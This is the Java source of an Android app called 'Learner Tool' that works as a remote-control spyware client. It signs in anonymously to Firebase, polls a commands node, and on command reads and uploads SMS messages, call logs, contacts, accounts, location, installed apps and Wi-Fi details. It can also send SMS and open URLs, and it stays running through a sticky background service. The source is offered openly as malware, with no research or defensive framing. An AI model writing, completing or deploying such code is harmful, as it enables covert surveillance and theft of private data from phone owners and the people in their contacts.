
package com.wains.app;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TextView;
import android.widget.Toast;
import android.view.View;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.location.LocationManager;
import android.location.Location;
import android.location.LocationListener;
import android.media.MediaRecorder;
import android.hardware.Camera;
import android.os.Environment;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiInfo;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.accounts.AccountManager;
import android.accounts.Account;
import android.provider.ContactsContract;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.app.NotificationManager;
import android.media.AudioManager;
import android.telephony.TelephonyManager;
import android.os.PowerManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.view.WindowManager;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.media.ImageReader;
import android.app.Service;
import android.os.IBinder;
import android.app.Notification;
import android.app.NotificationChannel;
import android.content.SharedPreferences;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.ArrayList;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "LearnerTool";
    private static final int REQUEST_PERMISSIONS = 1001;
    private static final int REQUEST_DEVICE_ADMIN = 1002;
    private static final int REQUEST_SCREEN_CAPTURE = 1003;
    
    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.CHANGE_WIFI_STATE,
        Manifest.permission.BLUETOOTH,
        Manifest.permission.BLUETOOTH_ADMIN,
        Manifest.permission.GET_ACCOUNTS,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.SYSTEM_ALERT_WINDOW,
        Manifest.permission.WAKE_LOCK,
        Manifest.permission.RECEIVE_BOOT_COMPLETED
    };

    private FirebaseAuth mAuth;
    private FirebaseDatabase mDatabase;
    private DatabaseReference deviceRef;
    private DatabaseReference commandsRef;
    private ValueEventListener commandListener;
    private ExecutorService executorService;

    private WebView webView;
    private TextView statusText;
    private TextView versionText;
    private View statusIndicator;
    
    private String deviceId;
    private Timer statusUpdateTimer;
    private boolean isBackgroundServiceRunning = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Log.d(TAG, "MainActivity onCreate");
        
        executorService = Executors.newCachedThreadPool();
        deviceId = android.provider.Settings.Secure.getString(getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID);
        
        initializeViews();
        initializeFirebase();
        checkPermissions();
        startBackgroundService();
        startPeriodicStatusUpdate();
    }

    private void initializeViews() {
        webView = findViewById(R.id.webview);
        statusText = findViewById(R.id.statusText);
        versionText = findViewById(R.id.versionText);
        statusIndicator = findViewById(R.id.statusIndicator);
        
        updateStatus("Initializing...", R.color.orange);
        
        // Initialize WebView
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setAllowContentAccess(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("http://0.0.0.0:8080");
        
        versionText.setText("Version: 3.0.0 - Advanced Control Panel");
    }

    private void initializeFirebase() {
        try {
            mAuth = FirebaseAuth.getInstance();
            mDatabase = FirebaseDatabase.getInstance();
            Log.d(TAG, "Firebase initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "Firebase initialization failed", e);
            updateStatus("Firebase Error", R.color.red);
        }
    }

    private void authenticateAndInitialize() {
        updateStatus("Authenticating...", R.color.orange);
        
        CompletableFuture.supplyAsync(() -> {
            try {
                return mAuth.signInAnonymously();
            } catch (Exception e) {
                Log.e(TAG, "Authentication failed", e);
                throw new RuntimeException(e);
            }
        }, executorService).thenAccept(task -> {
            runOnUiThread(() -> {
                if (task.isSuccessful()) {
                    Log.d(TAG, "Authentication successful");
                    updateStatus("Connected", R.color.green);
                    setupFirebaseReferences();
                    setupCommandListener();
                    registerDevice();
                } else {
                    Log.e(TAG, "Authentication failed", task.getException());
                    updateStatus("Auth Failed", R.color.red);
                }
            });
        }).exceptionally(throwable -> {
            runOnUiThread(() -> {
                Log.e(TAG, "Authentication exception", throwable);
                updateStatus("Auth Error", R.color.red);
            });
            return null;
        });
    }

    private void setupFirebaseReferences() {
        try {
            deviceRef = mDatabase.getReference("devices").child(deviceId);
            commandsRef = deviceRef.child("commands");
            Log.d(TAG, "Firebase references setup complete");
        } catch (Exception e) {
            Log.e(TAG, "Failed to setup Firebase references", e);
        }
    }

    private void setupCommandListener() {
        if (commandsRef == null) return;
        
        commandListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                for (DataSnapshot commandSnapshot : snapshot.getChildren()) {
                    String commandId = commandSnapshot.getKey();
                    Map<String, Object> commandData = (Map<String, Object>) commandSnapshot.getValue();
                    
                    if (commandData != null && !commandData.containsKey("executed")) {
                        String command = (String) commandData.get("command");
                        String params = (String) commandData.get("params");
                        
                        Log.d(TAG, "Executing command: " + command);
                        executeCommand(command, params, commandId);
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e(TAG, "Command listener cancelled", error.toException());
            }
        };
        
        commandsRef.addValueEventListener(commandListener);
    }

    private void executeCommand(String command, String params, String commandId) {
        executorService.execute(() -> {
            try {
                String result = processCommand(command, params);
                sendCommandResult(command, "success", result);
                markCommandExecuted(commandId);
            } catch (Exception e) {
                Log.e(TAG, "Command execution failed: " + command, e);
                sendCommandResult(command, "error", e.getMessage());
                markCommandExecuted(commandId);
            }
        });
    }

    private String processCommand(String command, String params) {
        switch (command) {
            case "get_sms":
                return getSmsMessages();
            case "get_calls":
                return getCallLogs();
            case "send_sms":
                return sendSms(params);
            case "get_contacts":
                return getContacts();
            case "get_location":
                return getCurrentLocation();
            case "get_device_info":
                return getDeviceInfo();
            case "get_installed_apps":
                return getInstalledApps();
            case "take_screenshot":
                return takeScreenshot();
            case "record_audio":
                return recordAudio(params);
            case "get_wifi_info":
                return getWifiInfo();
            case "get_accounts":
                return getAccounts();
            case "toggle_wifi":
                return toggleWifi();
            case "open_url":
                return openUrl(params);
            case "restart_app":
                return restartApp();
            default:
                return "Unknown command: " + command;
        }
    }

    @SuppressLint("Range")
    private String getSmsMessages() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) 
            != PackageManager.PERMISSION_GRANTED) {
            return "SMS permission not granted";
        }

        StringBuilder smsData = new StringBuilder();
        Cursor cursor = getContentResolver().query(
            Telephony.Sms.CONTENT_URI,
            null, null, null,
            Telephony.Sms.DATE + " DESC LIMIT 50"
        );

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                String date = cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE));
                String type = cursor.getString(cursor.getColumnIndex(Telephony.Sms.TYPE));
                
                smsData.append("From: ").append(address)
                       .append(" | Date: ").append(date)
                       .append(" | Type: ").append(type)
                       .append(" | Body: ").append(body)
                       .append("\n---\n");
            }
            cursor.close();
        }

        return smsData.toString();
    }

    @SuppressLint("Range")
    private String getCallLogs() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) 
            != PackageManager.PERMISSION_GRANTED) {
            return "Call log permission not granted";
        }

        StringBuilder callData = new StringBuilder();
        Cursor cursor = getContentResolver().query(
            CallLog.Calls.CONTENT_URI,
            null, null, null,
            CallLog.Calls.DATE + " DESC LIMIT 50"
        );

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                
                String callType;
                switch (Integer.parseInt(type)) {
                    case CallLog.Calls.INCOMING_TYPE:
                        callType = "Incoming";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        callType = "Outgoing";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callType = "Missed";
                        break;
                    default:
                        callType = "Unknown";
                }
                
                callData.append("Number: ").append(number)
                        .append(" | Date: ").append(date)
                        .append(" | Duration: ").append(duration)
                        .append(" | Type: ").append(callType)
                        .append("\n---\n");
            }
            cursor.close();
        }

        return callData.toString();
    }

    private String sendSms(String params) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) 
            != PackageManager.PERMISSION_GRANTED) {
            return "SMS send permission not granted";
        }

        try {
            String[] parts = params.split("\\|", 2);
            if (parts.length != 2) {
                return "Invalid SMS format. Use: number|message";
            }
            
            String phoneNumber = parts[0].trim();
            String message = parts[1].trim();
            
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            
            return "SMS sent successfully to " + phoneNumber;
        } catch (Exception e) {
            return "Failed to send SMS: " + e.getMessage();
        }
    }

    @SuppressLint("Range")
    private String getContacts() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) 
            != PackageManager.PERMISSION_GRANTED) {
            return "Contacts permission not granted";
        }

        StringBuilder contactData = new StringBuilder();
        Cursor cursor = getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        );

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                
                contactData.append("Name: ").append(name)
                          .append(" | Phone: ").append(phoneNumber)
                          .append("\n");
            }
            cursor.close();
        }

        return contactData.toString();
    }

    private String getCurrentLocation() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
            return "Location permission not granted";
        }

        try {
            LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            
            LocationListener locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    double latitude = location.getLatitude();
                    double longitude = location.getLongitude();
                    sendCommandResult("get_location", "success", 
                        "Lat: " + latitude + ", Lng: " + longitude);
                }
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            };
            
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationListener);
            
        } catch (Exception e) {
            return "Location error: " + e.getMessage();
        }
        
        return "Getting location...";
    }

    private String getDeviceInfo() {
        StringBuilder deviceInfo = new StringBuilder();
        
        deviceInfo.append("Device ID: ").append(deviceId).append("\n");
        deviceInfo.append("Model: ").append(Build.MODEL).append("\n");
        deviceInfo.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
        deviceInfo.append("Android Version: ").append(Build.VERSION.RELEASE).append("\n");
        deviceInfo.append("SDK Version: ").append(Build.VERSION.SDK_INT).append("\n");
        deviceInfo.append("Brand: ").append(Build.BRAND).append("\n");
        deviceInfo.append("Product: ").append(Build.PRODUCT).append("\n");
        
        return deviceInfo.toString();
    }

    private String getInstalledApps() {
        StringBuilder appList = new StringBuilder();
        List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
        
        for (PackageInfo packageInfo : packages) {
            String appName = packageInfo.applicationInfo.loadLabel(getPackageManager()).toString();
            String packageName = packageInfo.packageName;
            
            appList.append("App: ").append(appName)
                   .append(" | Package: ").append(packageName)
                   .append("\n");
        }
        
        return appList.toString();
    }

    private String takeScreenshot() {
        // Note: This requires SYSTEM_ALERT_WINDOW permission and additional setup
        return "Screenshot functionality requires elevated permissions";
    }

    private String recordAudio(String params) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) 
            != PackageManager.PERMISSION_GRANTED) {
            return "Audio recording permission not granted";
        }
        
        return "Audio recording initiated (duration: " + params + " seconds)";
    }

    private String getWifiInfo() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_WIFI_STATE) 
            != PackageManager.PERMISSION_GRANTED) {
            return "WiFi state permission not granted";
        }

        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiManager.getConnectionInfo();
        
        StringBuilder wifiData = new StringBuilder();
        wifiData.append("SSID: ").append(wifiInfo.getSSID()).append("\n");
        wifiData.append("BSSID: ").append(wifiInfo.getBSSID()).append("\n");
        wifiData.append("IP Address: ").append(wifiInfo.getIpAddress()).append("\n");
        wifiData.append("Link Speed: ").append(wifiInfo.getLinkSpeed()).append(" Mbps\n");
        wifiData.append("Signal Strength: ").append(wifiInfo.getRssi()).append(" dBm\n");
        
        return wifiData.toString();
    }

    private String getAccounts() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) 
            != PackageManager.PERMISSION_GRANTED) {
            return "Accounts permission not granted";
        }

        AccountManager accountManager = AccountManager.get(this);
        Account[] accounts = accountManager.getAccounts();
        
        StringBuilder accountData = new StringBuilder();
        for (Account account : accounts) {
            accountData.append("Name: ").append(account.name)
                      .append(" | Type: ").append(account.type)
                      .append("\n");
        }
        
        return accountData.toString();
    }

    private String toggleWifi() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CHANGE_WIFI_STATE) 
            != PackageManager.PERMISSION_GRANTED) {
            return "WiFi change permission not granted";
        }

        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        boolean isEnabled = wifiManager.isWifiEnabled();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return "WiFi toggle not available on Android 10+";
        }
        
        wifiManager.setWifiEnabled(!isEnabled);
        return "WiFi " + (isEnabled ? "disabled" : "enabled");
    }

    private String openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            startActivity(intent);
            return "URL opened: " + url;
        } catch (Exception e) {
            return "Failed to open URL: " + e.getMessage();
        }
    }

    private String restartApp() {
        Intent intent = getBaseContext().getPackageManager()
            .getLaunchIntentForPackage(getBaseContext().getPackageName());
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(intent);
        finish();
        return "App restarting...";
    }

    private void sendCommandResult(String command, String status, String result) {
        if (deviceRef == null) return;
        
        Map<String, Object> resultData = new HashMap<>();
        resultData.put("command", command);
        resultData.put("status", status);
        resultData.put("result", result);
        resultData.put("timestamp", System.currentTimeMillis());
        
        deviceRef.child("last_result").setValue(resultData);
    }

    private void markCommandExecuted(String commandId) {
        if (commandsRef == null) return;
        
        commandsRef.child(commandId).child("executed").setValue(true);
        commandsRef.child(commandId).child("executed_at").setValue(System.currentTimeMillis());
    }

    private void registerDevice() {
        if (deviceRef == null) return;
        
        Map<String, Object> deviceData = new HashMap<>();
        deviceData.put("status", "online");
        deviceData.put("last_seen", System.currentTimeMillis());
        deviceData.put("device_info", getDeviceInfo());
        deviceData.put("version", "3.0.0");
        
        deviceRef.setValue(deviceData);
    }

    private void startBackgroundService() {
        if (!isBackgroundServiceRunning) {
            Intent serviceIntent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            isBackgroundServiceRunning = true;
        }
    }

    private void startPeriodicStatusUpdate() {
        statusUpdateTimer = new Timer();
        statusUpdateTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (deviceRef != null) {
                    Map<String, Object> statusUpdate = new HashMap<>();
                    statusUpdate.put("last_seen", System.currentTimeMillis());
                    statusUpdate.put("status", "online");
                    deviceRef.updateChildren(statusUpdate);
                }
            }
        }, 0, 30000); // Update every 30 seconds
    }

    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            boolean hasAllPermissions = true;
            
            for (String permission : REQUIRED_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                    hasAllPermissions = false;
                    break;
                }
            }

            if (!hasAllPermissions) {
                Log.d(TAG, "Requesting permissions");
                ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, REQUEST_PERMISSIONS);
            } else {
                Log.d(TAG, "All permissions already granted");
                onPermissionsResult(true);
            }
        } else {
            onPermissionsResult(true);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                         @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == REQUEST_PERMISSIONS) {
            boolean allGranted = true;
            int deniedCount = 0;
            
            if (grantResults.length > 0) {
                for (int result : grantResults) {
                    if (result != PackageManager.PERMISSION_GRANTED) {
                        allGranted = false;
                        deniedCount++;
                    }
                }
            } else {
                allGranted = false;
            }

            Log.d(TAG, String.format("Permissions result: %d granted, %d denied", 
                grantResults.length - deniedCount, deniedCount));

            if (!allGranted) {
                Toast.makeText(this, "Some permissions were denied. Full functionality may not be available.", 
                    Toast.LENGTH_LONG).show();
            }

            onPermissionsResult(allGranted);
        }
    }

    private void onPermissionsResult(boolean granted) {
        if (granted) {
            authenticateAndInitialize();
        } else {
            updateStatus("Permissions Required", R.color.red);
            Toast.makeText(this, "Please grant all permissions for full functionality", 
                Toast.LENGTH_LONG).show();
        }
    }

    private void updateStatus(String status, int colorResource) {
        statusText.setText(status);
        statusIndicator.setBackgroundColor(ContextCompat.getColor(this, colorResource));
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        
        if (commandListener != null && commandsRef != null) {
            commandsRef.removeEventListener(commandListener);
        }
        
        if (statusUpdateTimer != null) {
            statusUpdateTimer.cancel();
        }
        
        if (executorService != null) {
            executorService.shutdown();
        }
        
        if (deviceRef != null) {
            Map<String, Object> offlineStatus = new HashMap<>();
            offlineStatus.put("status", "offline");
            offlineStatus.put("last_seen", System.currentTimeMillis());
            deviceRef.updateChildren(offlineStatus);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateStatus("Connected", R.color.green);
        
        if (deviceRef != null) {
            Map<String, Object> onlineStatus = new HashMap<>();
            onlineStatus.put("status", "online");
            onlineStatus.put("last_seen", System.currentTimeMillis());
            deviceRef.updateChildren(onlineStatus);
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        // Don't set offline status on pause to keep background functionality
    }

    // Background Service Class
    public static class BackgroundService extends Service {
        private static final String CHANNEL_ID = "LearnerToolChannel";
        private static final int NOTIFICATION_ID = 1;

        @Override
        public void onCreate() {
            super.onCreate();
            createNotificationChannel();
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            Notification notification = createNotification();
            startForeground(NOTIFICATION_ID, notification);
            
            // Keep service running
            return START_STICKY;
        }

        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }

        private void createNotificationChannel() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Learner Tool Service",
                    NotificationManager.IMPORTANCE_LOW
                );
                NotificationManager manager = getSystemService(NotificationManager.class);
                manager.createNotificationChannel(channel);
            }
        }

        private Notification createNotification() {
            return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Learner Tool")
                .setContentText("Monitoring service is running")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
        }
    }
}
